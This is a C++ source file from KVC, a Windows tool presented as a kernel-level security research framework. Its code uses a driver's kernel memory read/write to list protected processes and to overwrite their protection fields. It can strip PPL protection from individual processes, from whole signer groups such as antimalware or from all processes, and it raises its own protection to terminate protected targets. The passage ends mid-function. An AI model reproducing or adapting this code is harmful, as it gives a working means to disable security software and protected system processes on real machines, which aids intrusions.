/*******************************************************************************
  _  ____     ______ 
 | |/ /\ \   / / ___|
 | ' /  \ \ / / |    
 | . \   \ V /| |___ 
 |_|\_\   \_/  \____|

The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
of kernel-level primitives** for legitimate security research and penetration testing.

KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
that define these protections.

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

*******************************************************************************/

// ControllerProcessOperations.cpp
#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include <regex>
#include <charconv>
#include <tlhelp32.h>
#include <unordered_map>

extern volatile bool g_interrupted;

// ============================================================================
// SESSION MANAGEMENT IMPLEMENTATION
// ============================================================================

bool Controller::BeginDriverSession() {
    // If driver is already active and used recently, keep it active
    if (m_driverSessionActive) {
        auto timeSinceLastUse = std::chrono::steady_clock::now() - m_lastDriverUsage;
        if (timeSinceLastUse < std::chrono::seconds(5)) {
            UpdateDriverUsageTimestamp();
            DEBUG(L"Reusing active driver session");
            return true;
        }
    }
    
    // Initialize driver component
    if (!EnsureDriverAvailable()) {
        ERROR(L"Failed to load driver for session");
        return false;
    }
    
    m_driverSessionActive = true;
    UpdateDriverUsageTimestamp();
    DEBUG(L"Driver session started successfully");
    return true;
}

void Controller::EndDriverSession(bool force) {
    if (!m_driverSessionActive) return;
    
    // Don't end session immediately if not forced - keep it alive for potential reuse
    if (!force) {
        auto timeSinceLastUse = std::chrono::steady_clock::now() - m_lastDriverUsage;
        if (timeSinceLastUse < std::chrono::seconds(10)) {
            DEBUG(L"Keeping driver session active for potential reuse");
            return; // Keep session alive
        }
    }
    
    // Force cleanup
    DEBUG(L"Ending driver session (force: %s)", force ? L"true" : L"false");
    PerformAtomicCleanup();
    m_driverSessionActive = false;
    m_kernelAddressCache.clear();
    m_cachedProcessList.clear();
}

void Controller::UpdateDriverUsageTimestamp() {
    m_lastDriverUsage = std::chrono::steady_clock::now();
}

void Controller::RefreshKernelAddressCache() {
    DEBUG(L"Refreshing kernel address cache");
    auto processes = GetProcessList();
    m_kernelAddressCache.clear();
    
    for (const auto& entry : processes) {
        m_kernelAddressCache[entry.Pid] = entry.KernelAddress;
    }
    
    m_cacheTimestamp = std::chrono::steady_clock::now();
    DEBUG(L"Kernel address cache refreshed with %d entries", m_kernelAddressCache.size());
}

std::optional<ULONG_PTR> Controller::GetCachedKernelAddress(DWORD pid) {
    // Refresh cache if it's older than 30 seconds or empty
    auto now = std::chrono::steady_clock::now();
    if (m_kernelAddressCache.empty() || 
        (now - m_cacheTimestamp) > std::chrono::seconds(30)) {
        RefreshKernelAddressCache();
    }
    
    auto it = m_kernelAddressCache.find(pid);
    if (it != m_kernelAddressCache.end()) {
        DEBUG(L"Found cached kernel address for PID %d: 0x%llx", pid, it->second);
        return it->second;
    }
    
    // PID not in cache, try to find it manually
    DEBUG(L"PID %d not in cache, searching manually", pid);
    auto processes = GetProcessList();
    for (const auto& entry : processes) {
        if (entry.Pid == pid) {
            m_kernelAddressCache[pid] = entry.KernelAddress;
            DEBUG(L"Added PID %d to kernel address cache: 0x%llx", pid, entry.KernelAddress);
            return entry.KernelAddress;
        }
    }
    
    ERROR(L"PID %d not found in process list", pid);
    return std::nullopt;
}

// ============================================================================
// PROCESS TERMINATION OPERATIONS
// ============================================================================

bool Controller::KillProcess(DWORD pid) noexcept {
    bool result = KillProcessInternal(pid, false);
    EndDriverSession(true);  // Force cleanup for single operations
    return result;
}

bool Controller::KillMultipleProcesses(const std::vector<DWORD>& pids) noexcept {
    if (pids.empty()) {
        ERROR(L"No PIDs provided for batch operation");
        return false;
    }
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for batch operation");
        return false;
    }
    
    INFO(L"Starting batch kill operation for %d processes", pids.size());
    
    DWORD successCount = 0;
    for (DWORD pid : pids) {
        INFO(L"Processing PID %d", pid);
        
        if (KillProcessInternal(pid, true)) {
            successCount++;
            SUCCESS(L"Successfully terminated PID %d", pid);
        } else {
            ERROR(L"Failed to terminate PID %d", pid);
        }
        
        if (g_interrupted) {
            INFO(L"Batch operation interrupted by user");
            break;
        }
    }
    
    EndDriverSession(true); // End session after batch operation
    INFO(L"Batch operation completed: %d/%d processes terminated", successCount, pids.size());
    
    return successCount > 0;
}

bool Controller::KillMultipleTargets(const std::vector<std::wstring>& targets) noexcept {
    if (targets.empty()) return false;
    
    if (!BeginDriverSession()) return false;
    
    std::vector<DWORD> allPids;
    
    for (const auto& target : targets) {
        if (Utils::IsNumeric(target)) {
            auto pid = Utils::ParsePid(target);
            if (pid) allPids.push_back(pid.value());
        } else {
            auto matches = FindProcessesByName(target);
            for (const auto& match : matches) {
                allPids.push_back(match.Pid);
            }
        }
    }
    
    if (allPids.empty()) {
        ERROR(L"No processes found matching the specified targets");
        EndDriverSession(true);
        return false;
    }
    
    INFO(L"Starting batch kill operation for %d resolved processes", allPids.size());
    
    DWORD successCount = 0;
    for (DWORD pid : allPids) {
        INFO(L"Processing PID %d", pid);
        
        if (KillProcessInternal(pid, true)) {
            successCount++;
            SUCCESS(L"Successfully terminated PID %d", pid);
        } else {
            ERROR(L"Failed to terminate PID %d", pid);
        }
        
        if (g_interrupted) {
            INFO(L"Batch operation interrupted by user");
            break;
        }
    }
    
		// Always force cleanup for command-line operation
		EndDriverSession(true);
		INFO(L"Kill operation completed: %d/%d processes terminated", successCount, allPids.size());
		return successCount > 0;
}

bool Controller::KillProcessInternal(DWORD pid, bool batchOperation) noexcept {
    // Only start session if not batch operation (batch already started session)
    if (!batchOperation && !BeginDriverSession()) {
        ERROR(L"Failed to start driver session for PID %d", pid);
        return false;
    }
    
    // Use cached kernel address if available
    auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr) {
        ERROR(L"Failed to get kernel address for PID %d", pid);
		if (!batchOperation) EndDriverSession(true);
        return false;
    }
    
    // Get target process protection level for elevation
    auto targetProtection = GetProcessProtection(kernelAddr.value());
    if (targetProtection && targetProtection.value() > 0) {
        UCHAR targetLevel = Utils::GetProtectionLevel(targetProtection.value());
        UCHAR targetSigner = Utils::GetSignerType(targetProtection.value());
        
        std::wstring levelStr = (targetLevel == static_cast<UCHAR>(PS_PROTECTED_TYPE::Protected)) ? 
                               L"PP" : L"PPL";
        
        INFO(L"Target process has %s-%s protection, elevating current process", 
             levelStr.c_str(), 
             Utils::GetSignerTypeAsString(targetSigner));

        // Elevate current process protection to match or exceed target
        UCHAR currentProcessProtection = Utils::GetProtection(targetLevel, targetSigner);
        if (!SetCurrentProcessProtection(currentProcessProtection)) {
            ERROR(L"Failed to elevate current process protection");
            // Continue anyway - might still work
        }
    }

    // Attempt standard process termination
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        DWORD error = GetLastError();
        ERROR(L"Failed to open process for termination (error: %d)", error);
        
        // Try with more privileges if available
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            ERROR(L"Failed to open process with extended privileges (error: %d)", GetLastError());
            return false;
        }
    }

    BOOL terminated = TerminateProcess(hProcess, 1);
    DWORD terminationError = GetLastError();
    CloseHandle(hProcess);

    if (terminated) {
        SUCCESS(L"Successfully terminated PID: %d", pid);
        return true;
    } else {
        ERROR(L"Failed to terminate PID: %d (error: %d)", pid, terminationError);
        return false;
    }
}

bool Controller::KillProcessByName(const std::wstring& processName) noexcept {
    if (!BeginDriverSession()) {
        return false;
    }
    
    auto matches = FindProcessesByName(processName);
    
    if (matches.empty()) {
        ERROR(L"No process found matching pattern: %s", processName.c_str());
        EndDriverSession(true);
        return false;
    }
    
    DWORD successCount = 0;
    DWORD totalCount = static_cast<DWORD>(matches.size());
    
    INFO(L"Found %d processes matching '%s'", totalCount, processName.c_str());
    
    for (const auto& match : matches) {
        INFO(L"Attempting to terminate process: %s (PID %d)", 
             match.ProcessName.c_str(), match.Pid);
        
        // Use the internal kill method with batch operation flag
        if (KillProcessInternal(match.Pid, true)) {
            SUCCESS(L"Successfully terminated: %s (PID %d)", 
                   match.ProcessName.c_str(), match.Pid);
            successCount++;
        } else {
            ERROR(L"Failed to terminate PID: %d", match.Pid);
        }
        
        if (g_interrupted) {
            INFO(L"Process termination interrupted by user");
            break;
        }
    }
    
    EndDriverSession(true);
    INFO(L"Kill operation completed: %d/%d processes terminated", successCount, totalCount);
    return successCount > 0;
}

// ============================================================================
// KERNEL PROCESS OPERATIONS
// ============================================================================

std::optional<ULONG_PTR> Controller::GetInitialSystemProcessAddress() noexcept {
    auto kernelBase = Utils::GetKernelBaseAddress();
    if (!kernelBase) return std::nullopt;

    auto offset = m_of->GetOffset(Offset::KernelPsInitialSystemProcess);
    if (!offset) return std::nullopt;

    ULONG_PTR pPsInitialSystemProcess = Utils::GetKernelAddress(kernelBase.value(), offset.value());
    return m_rtc->ReadPtr(pPsInitialSystemProcess);
}

std::optional<ULONG_PTR> Controller::GetProcessKernelAddress(DWORD pid) noexcept {
    auto processes = GetProcessList();
    for (const auto& entry : processes) {
        if (entry.Pid == pid)
            return entry.KernelAddress;
    }
    
    DEBUG(L"Kernel address not available for PID %d", pid);
    return std::nullopt;
}

std::vector<ProcessEntry> Controller::GetProcessList() noexcept {
    std::vector<ProcessEntry> processes;
    
    if (g_interrupted) {
        INFO(L"Process enumeration cancelled by user before start");
        return processes;
    }
    
    auto initialProcess = GetInitialSystemProcessAddress();
    if (!initialProcess) return processes;

    auto uniqueIdOffset = m_of->GetOffset(Offset::ProcessUniqueProcessId);
    auto linksOffset = m_of->GetOffset(Offset::ProcessActiveProcessLinks);
    
    if (!uniqueIdOffset || !linksOffset) return processes;

    ULONG_PTR current = initialProcess.value();
    DWORD processCount = 0;

    do {
        if (g_interrupted) {
            break;
        }

        auto pidPtr = m_rtc->ReadPtr(current + uniqueIdOffset.value());
        
        if (g_interrupted) {
            break;
        }
        
        auto protection = GetProcessProtection(current);
        
        std::optional<UCHAR> signatureLevel = std::nullopt;
        std::optional<UCHAR> sectionSignatureLevel = std::nullopt;
        
        auto sigLevelOffset = m_of->GetOffset(Offset::ProcessSignatureLevel);
        auto secSigLevelOffset = m_of->GetOffset(Offset::ProcessSectionSignatureLevel);
        
        if (g_interrupted) {
            break;
        }
        
        if (sigLevelOffset)
            signatureLevel = m_rtc->Read8(current + sigLevelOffset.value());
        if (secSigLevelOffset)
            sectionSignatureLevel = m_rtc->Read8(current + secSigLevelOffset.value());
        
        if (pidPtr && protection) {
            ULONG_PTR pidValue = pidPtr.value();
            
            if (pidValue > 0 && pidValue <= MAXDWORD) {
                ProcessEntry entry{};
                entry.KernelAddress = current;
                entry.Pid = static_cast<DWORD>(pidValue);
                entry.ProtectionLevel = Utils::GetProtectionLevel(protection.value());
                entry.SignerType = Utils::GetSignerType(protection.value());
                entry.SignatureLevel = signatureLevel.value_or(0);
                entry.SectionSignatureLevel = sectionSignatureLevel.value_or(0);
                
                if (g_interrupted) {
                    break;
                }
                
                std::wstring basicName = Utils::GetProcessName(entry.Pid);
                
                // Resolve unknown processes using enhanced detection
                if (basicName == L"[Unknown]") {
                    entry.ProcessName = Utils::ResolveUnknownProcessLocal(
                        entry.Pid, 
                        entry.KernelAddress, 
                        entry.ProtectionLevel, 
                        entry.SignerType
                    );
                } else {
                    entry.ProcessName = basicName;
                }
                
                processes.push_back(entry);
                processCount++;
            }
        }

        if (g_interrupted) {
            break;
        }

        auto nextPtr = m_rtc->ReadPtr(current + linksOffset.value());
        if (!nextPtr) break;
        
        current = nextPtr.value() - linksOffset.value();
        
        // Safety limit to prevent infinite loops
        if (processCount >= 10000) {
            break;
        }
        
    } while (current != initialProcess.value() && !g_interrupted);

    return processes;
}

std::optional<UCHAR> Controller::GetProcessProtection(ULONG_PTR addr) noexcept {
    auto offset = m_of->GetOffset(Offset::ProcessProtection);
    if (!offset) return std::nullopt;
    
    return m_rtc->Read8(addr + offset.value());
}

bool Controller::SetProcessProtection(ULONG_PTR addr, UCHAR protection) noexcept {
    auto offset = m_of->GetOffset(Offset::ProcessProtection);
    if (!offset) return false;

    return m_rtc->Write8(addr + offset.value(), protection);
}

// ============================================================================
// PROCESS NAME RESOLUTION
// ============================================================================

std::optional<ProcessMatch> Controller::ResolveProcessName(const std::wstring& processName) noexcept {
    if (!BeginDriverSession()) {
		EndDriverSession(true);
        return std::nullopt;
    }
    
    auto matches = FindProcessesByName(processName);
    
    if (matches.empty()) {
        ERROR(L"No process found matching pattern: %s", processName.c_str());
        EndDriverSession(true);  // Force cleanup
        return std::nullopt;
    }
    
    if (matches.size() == 1) {
        INFO(L"Found process: %s (PID %d)", matches[0].ProcessName.c_str(), matches[0].Pid);
        EndDriverSession(true);  // Force cleanup
        return matches[0];
    }
    
    ERROR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:", processName.c_str());
    for (const auto& match : matches) {
        std::wcout << L"  PID " << match.Pid << L": " << match.ProcessName << L"\n";
    }
    
    EndDriverSession(true);  // Force cleanup
    return std::nullopt;
}

std::vector<ProcessMatch> Controller::FindProcessesByName(const std::wstring& pattern) noexcept {
    std::vector<ProcessMatch> matches;
    auto processes = GetProcessList();
    
    for (const auto& entry : processes) {
        if (IsPatternMatch(entry.ProcessName, pattern)) {
            ProcessMatch match;
            match.Pid = entry.Pid;
            match.ProcessName = entry.ProcessName;
            match.KernelAddress = entry.KernelAddress;
            matches.push_back(match);
        }
    }
    
    return matches;
}

// ============================================================================
// DRIVER-FREE PROCESS OPERATIONS
// ============================================================================

std::optional<ProcessMatch> Controller::ResolveNameWithoutDriver(const std::wstring& processName) noexcept {
    auto matches = FindProcessesByNameWithoutDriver(processName);
    
    if (matches.empty()) {
        ERROR(L"No process found matching pattern: %s", processName.c_str());
        return std::nullopt;
    }
    
    if (matches.size() == 1) {
        INFO(L"Found process: %s (PID %d)", matches[0].ProcessName.c_str(), matches[0].Pid);
        return matches[0];
    }
    
    ERROR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:", processName.c_str());
    for (const auto& match : matches) {
        std::wcout << L"  PID " << match.Pid << L": " << match.ProcessName << L"\n";
    }
    
    return std::nullopt;
}

std::vector<ProcessMatch> Controller::FindProcessesByNameWithoutDriver(const std::wstring& pattern) noexcept {
    std::vector<ProcessMatch> matches;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return matches;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            std::wstring processName = pe.szExeFile;
            
            if (IsPatternMatch(processName, pattern)) {
                ProcessMatch match;
                match.Pid = pe.th32ProcessID;
                match.ProcessName = processName;
                match.KernelAddress = 0; // Not available without driver
                matches.push_back(match);
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return matches;
}

// ============================================================================
// PATTERN MATCHING
// ============================================================================

bool Controller::IsPatternMatch(const std::wstring& processName, const std::wstring& pattern) noexcept {
    std::wstring lowerProcessName = processName;
    std::wstring lowerPattern = pattern;
    
    // Convert to lowercase for case-insensitive matching
    std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::towlower);
    std::transform(lowerPattern.begin(), lowerPattern.end(), lowerPattern.begin(), ::towlower);
    
    // Exact match
    if (lowerProcessName == lowerPattern) return true;
    
    // Substring match
    if (lowerProcessName.find(lowerPattern) != std::wstring::npos) return true;
    
    // Wildcard pattern matching
    std::wstring regexPattern = lowerPattern;
    
    // Escape special regex characters except *
    std::wstring specialChars = L"\\^$.+{}[]|()";
    
    for (auto& ch : regexPattern) {
        if (specialChars.find(ch) != std::wstring::npos) {
            regexPattern = std::regex_replace(regexPattern, std::wregex(std::wstring(1, ch)), L"\\" + std::wstring(1, ch));
        }
    }
    
    // Convert * wildcards to regex .*
    regexPattern = std::regex_replace(regexPattern, std::wregex(L"\\*"), L".*");
    
    try {
        std::wregex regex(regexPattern, std::regex_constants::icase);
        return std::regex_search(lowerProcessName, regex);
    } catch (const std::regex_error&) {
        return false;
    }
}

// ============================================================================
// PROCESS INFORMATION OPERATIONS
// ============================================================================

bool Controller::GetProcessProtection(DWORD pid) noexcept {
    if (!BeginDriverSession()) {
		EndDriverSession(true);
        return false;
    }
    
    auto kernelAddr = GetProcessKernelAddress(pid);
    if (!kernelAddr) {
        ERROR(L"Failed to get kernel address for PID %d", pid);
        EndDriverSession(true);  // Force cleanup
        return false;
    }
    
    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        ERROR(L"Failed to read protection for PID %d", pid);
        EndDriverSession(true);  // Force cleanup
        return false;
    }
    
    UCHAR protLevel = Utils::GetProtectionLevel(currentProtection.value());
    UCHAR signerType = Utils::GetSignerType(currentProtection.value());
    
    if (currentProtection.value() == 0) {
        INFO(L"PID %d (%s) is not protected", pid, Utils::GetProcessName(pid).c_str());
    } else {
        INFO(L"PID %d (%s) protection: %s-%s (raw: 0x%02x)", 
             pid, 
             Utils::GetProcessName(pid).c_str(),
             Utils::GetProtectionLevelAsString(protLevel),
             Utils::GetSignerTypeAsString(signerType),
             currentProtection.value());
    }
    
    EndDriverSession(true);  // Force cleanup
    return true;
}

bool Controller::GetProcessProtectionByName(const std::wstring& processName) noexcept {
    auto match = ResolveNameWithoutDriver(processName);
    if (!match) {
        return false;
    }
    
    return GetProcessProtection(match->Pid);
}

// ============================================================================
// PROTECTED PROCESS LISTING
// ============================================================================

bool Controller::ListProtectedProcesses() noexcept {
    if (!BeginDriverSession()) {
        EndDriverSession(true);
        return false;
    }
    
    auto processes = GetProcessList();
    DWORD count = 0;

    // Enable ANSI colors using Utils function
    if (!Utils::EnableConsoleVirtualTerminal()) {
        ERROR(L"Failed to enable console colors");
    }

    std::wcout << Utils::ProcessColors::GREEN;
    std::wcout << L"\n -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";
    std::wcout << Utils::ProcessColors::HEADER;
    std::wcout << L"   PID  |         Process Name         |  Level  |     Signer      |     EXE sig. level    |     DLL sig. level    |    Kernel addr.    ";
    std::wcout << Utils::ProcessColors::RESET << L"\n";
    std::wcout << Utils::ProcessColors::GREEN;
    std::wcout << L" -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";

    for (const auto& entry : processes) {
        if (entry.ProtectionLevel > 0) {
            // Use centralized color logic instead of duplicated code
            const wchar_t* processColor = Utils::GetProcessDisplayColor(
                entry.SignerType, 
                entry.SignatureLevel, 
                entry.SectionSignatureLevel
            );

            wchar_t buffer[512];
            swprintf_s(buffer, L" %6d | %-28s | %-3s (%d) | %-11s (%d) | %-14s (0x%02x) | %-14s (0x%02x) | 0x%016llx\n",
                entry.Pid,
                entry.ProcessName.length() > 28 ? 
                    (entry.ProcessName.substr(0, 25) + L"...").c_str() : entry.ProcessName.c_str(),
                Utils::GetProtectionLevelAsString(entry.ProtectionLevel), entry.ProtectionLevel,
                Utils::GetSignerTypeAsString(entry.SignerType), entry.SignerType,
                Utils::GetSignatureLevelAsString(entry.SignatureLevel), entry.SignatureLevel,
                Utils::GetSignatureLevelAsString(entry.SectionSignatureLevel), entry.SectionSignatureLevel,
                entry.KernelAddress);

            std::wcout << processColor << buffer << Utils::ProcessColors::RESET;
            count++;
        }
    }

    std::wcout << Utils::ProcessColors::GREEN;
    std::wcout << L" -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";
    std::wcout << Utils::ProcessColors::RESET;

    SUCCESS(L"Listed %d protected processes", count);
    EndDriverSession(true);
    return count > 0;
}

// ============================================================================
// PROCESS PROTECTION MANIPULATION
// ============================================================================

bool Controller::UnprotectProcess(DWORD pid) noexcept {
    if (!BeginDriverSession()) {
		EndDriverSession(true);
        return false;
    }
    
    auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr) {
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    if (currentProtection.value() == 0) {
        ERROR(L"PID %d is not protected", pid);
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    if (!SetProcessProtection(kernelAddr.value(), 0)) {
        ERROR(L"Failed to remove protection from PID %d", pid);
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    SUCCESS(L"Removed protection from PID %d", pid);
    EndDriverSession(true);  // Force cleanup
    return true;
}

bool Controller::ProtectProcess(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    if (!BeginDriverSession()) {
		EndDriverSession(true);
        return false;
    }
    
    auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr) {
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection) {
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    if (currentProtection.value() > 0) {
        ERROR(L"PID %d is already protected", pid);
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    auto level = Utils::GetProtectionLevelFromString(protectionLevel);
    auto signer = Utils::GetSignerTypeFromString(signerType);
    
    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type");
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    if (!SetProcessProtection(kernelAddr.value(), newProtection)) {
        ERROR(L"Failed to protect PID %d", pid);
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    SUCCESS(L"Protected PID %d with %s-%s", pid, protectionLevel.c_str(), signerType.c_str());
    EndDriverSession(true);  // Force cleanup
    return true;
}

bool Controller::SetProcessProtection(DWORD pid, const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    if (!BeginDriverSession()) {
		EndDriverSession(true);
        return false;
    }
    
    auto level = Utils::GetProtectionLevelFromString(protectionLevel);
    auto signer = Utils::GetSignerTypeFromString(signerType);
    
    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type");
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr) {
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    
    if (!SetProcessProtection(kernelAddr.value(), newProtection)) {
        ERROR(L"Failed to set protection on PID %d", pid);
        EndDriverSession(true);  // Force cleanup
        return false;
    }

    SUCCESS(L"Set protection %s-%s on PID %d", protectionLevel.c_str(), signerType.c_str(), pid);
    EndDriverSession(true);  // Force cleanup
    return true;
}

// ============================================================================
// MASS PROTECTION OPERATIONS
// ============================================================================

bool Controller::UnprotectAllProcesses() noexcept
{
    if (!BeginDriverSession()) {
        EndDriverSession(true);
        return false;
    }

    auto processes = GetProcessList();
    
    // Group processes by signer type
    std::unordered_map<std::wstring, std::vector<ProcessEntry>> groupedProcesses;
    
    for (const auto& entry : processes)
    {
        if (entry.ProtectionLevel > 0)
        {
            std::wstring signerName = Utils::GetSignerTypeAsString(entry.SignerType);
            groupedProcesses[signerName].push_back(entry);
        }
    }
    
    if (groupedProcesses.empty())
    {
        INFO(L"No protected processes found");
        EndDriverSession(true);
        return false;
    }
    
    INFO(L"Starting mass unprotection (%zu signer groups)", groupedProcesses.size());
    
    DWORD totalSuccess = 0;
    DWORD totalProcessed = 0;
    
    // Process each signer group
    for (const auto& [signerName, processes] : groupedProcesses)
    {
        INFO(L"Processing signer group: %s (%zu processes)", signerName.c_str(), processes.size());
        
        // Save state before modification
        m_sessionMgr.SaveUnprotectOperation(signerName, processes);
        
        // Unprotect all in this group
        for (const auto& entry : processes)
        {
            totalProcessed++;
            
            if (SetProcessProtection(entry.KernelAddress, 0))
            {
                totalSuccess++;
                SUCCESS(L"Removed protection from PID %d (%s)", entry.Pid, entry.ProcessName.c_str());
            }
            else
            {
                ERROR(L"Failed to remove protection from PID %d (%s)", entry.Pid, entry.ProcessName.c_str());
            }
            
            if (g_interrupted)
            {
                INFO(L"Mass unprotection interrupted by user");
                EndDriverSession(true);
                return false;
            }
        }
    }
    
    INFO(L"Mass unprotection completed: %d/%d processes successfully unprotected", totalSuccess, totalProcessed);
    
    EndDriverSession(true);
    return totalSuccess > 0;
}

// ControllerProcessOperations.cpp
// DODAJ tę funkcję (po funkcji UnprotectAllProcesses, przed końcem pliku):

bool Controller::UnprotectMultipleProcesses(const std::vector<std::wstring>& targets) noexcept
{
    if (targets.empty())
        return false;

    if (!BeginDriverSession()) {
        EndDriverSession(true);
        return false;
    }

    DWORD successCount = 0;
    DWORD totalCount = static_cast<DWORD>(targets.size());

    for (const auto& target : targets)
    {
        bool result = false;

        // Check if target is numeric (PID)
        bool isNumeric = true;
        for (wchar_t ch : target)
        {
            if (!iswdigit(ch))
            {
                isNumeric = false;
                break;
            }
        }

        if (isNumeric)
        {
            try {
                DWORD pid = std::stoul(target);
                result = UnprotectProcess(pid);
            }
            catch (...) {
                ERROR(L"Invalid PID: %s", target.c_str());
            }
        }
        else
        {
            result = UnprotectProcessByName(target);
        }

        if (result) successCount++;
    }

    INFO(L"Batch unprotection completed: %d/%d targets successfully processed", successCount, totalCount);

    EndDriverSession(true);

    return successCount == totalCount;
}

bool Controller::UnprotectBySigner(const std::wstring& signerName) noexcept {
    auto signerType = Utils::GetSignerTypeFromString(signerName);
    if (!signerType) {
        ERROR(L"Invalid signer type: %s", signerName.c_str());
        return false;
    }

    if (!BeginDriverSession()) {
        EndDriverSession(true);
        return false;
    }

    auto processes = GetProcessList();
    std::vector<ProcessEntry> affectedProcesses;
    DWORD totalCount = 0;
    DWORD successCount = 0;

    INFO(L"Starting batch unprotection of processes signed by: %s", signerName.c_str());

    // Collect processes that will be affected
    for (const auto& entry : processes) {
        if (entry.ProtectionLevel > 0 && entry.SignerType == signerType.value()) {
            affectedProcesses.push_back(entry);
            totalCount++;
        }
    }
    
    // Save state before modification
    if (!affectedProcesses.empty()) {
        m_sessionMgr.SaveUnprotectOperation(signerName, affectedProcesses);
    }

    // POPRAWIONE: Usunięte błędne zagnieżdżenie
    for (const auto& entry : affectedProcesses) {
        if (SetProcessProtection(entry.KernelAddress, 0)) {
            successCount++;
            SUCCESS(L"Removed protection from PID %d (%s)", entry.Pid, entry.ProcessName.c_str());
        } else {
            ERROR(L"Failed to remove protection from PID %d (%s)", entry.Pid, entry.ProcessName.c_str());
        }

        if (g_interrupted) {
            INFO(L"Batch operation interrupted by user");
            break;
        }
    }

    if (totalCount == 0) {
        INFO(L"No protected processes found with signer: %s", signerName.c_str());
    } else {
        INFO(L"Batch unprotection completed: %d/%d processes successfully unprotected", successCount, totalCount);
    }
    
    EndDriverSession(true); 
    return successCount > 0;
}

/**
 * Lists all processes that have the specified signer type.
 * Displays process information in a formatted table including PID, name, protection level,
 * signer type, signature levels, and kernel address.
 * 
 * @param signerName The name of the signer type to filter by (e.g., "Windows", "Antimalware", "WinTcb")
 * @return true if processes were found and displayed, false if signer type is invalid or no processes match
 */
bool Controller::ListProcessesBySigner(const std::wstring& signerName) noexcept {
    auto signerType = Utils::GetSignerTypeFromString(signerName);
    if (!signerType) {
        ERROR(L"Invalid signer type: %s", signerName.c_str());
        return false;
    }

    std::vector<ProcessEntry> processes;
    
    if (!BeginDriverSession()) {
        return false;
    }
    
    processes = GetProcessList(); // Collect data while driver is active
    EndDriverSession(true); // Close driver session immediately
    
    // Enable ANSI colors - same as ListProtectedProcesses
    if (!Utils::EnableConsoleVirtualTerminal()) {
        ERROR(L"Failed to enable console colors");
        // Continue anyway, just without colors
    }
    
    bool foundAny = false;
    
    INFO(L"Processes with signer: %s", signerName.c_str());
    
    // Use same table formatting as ListProtectedProcesses
    std::wcout << Utils::ProcessColors::GREEN;
    std::wcout << L"\n -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";
    std::wcout << Utils::ProcessColors::HEADER;
    std::wcout << L"   PID  |         Process Name         |  Level  |     Signer      |     EXE sig. level    |     DLL sig. level    |    Kernel addr.    ";
    std::wcout << Utils::ProcessColors::RESET << L"\n";
    std::wcout << Utils::ProcessColors::GREEN;
    std::wcout << L" -------+------------------------------+---------+-----------------+-----------------------+-----------------------+--------------------\n";
    std::wcout << Utils::ProcessColors::RESET;
    
    for (const auto& entry : processes) {
        if (entry.SignerType == signerType.value()) {
            foundAny = true;
            
            // Use centralized color logic
            const wchar_t* processColor = Utils::GetProcessDisplayColor(
                entry.SignerType, 
                entry.SignatureLevel, 
                entry.SectionSignatureLevel
            );
            
            wchar_t buffer[512];
            
            std::wcout << processColor; // Apply color
            
            // Use consistent column widths and formatting
            swprintf_s(buffer, L" %6d | %-28s | %-3s (%d) | %-11s (%d) | %-14s (0x%02x) | %-14s (0x%02x) | 0x%016llx\n",
                entry.Pid,
                entry.ProcessName.length() > 28 ? 
                    (entry.ProcessName.substr(0, 25) + L"...").c_str() : entry.ProcessName.c_str(),
                Utils::GetProtectionLevelAsString(entry.ProtectionLevel), entry.ProtectionLevel,
                Utils::GetSignerTypeAsString(entry.SignerType), entry.SignerType,
                Utils::GetSignatureLevelAsString(entry.SignatureLevel), entry.SignatureLevel,
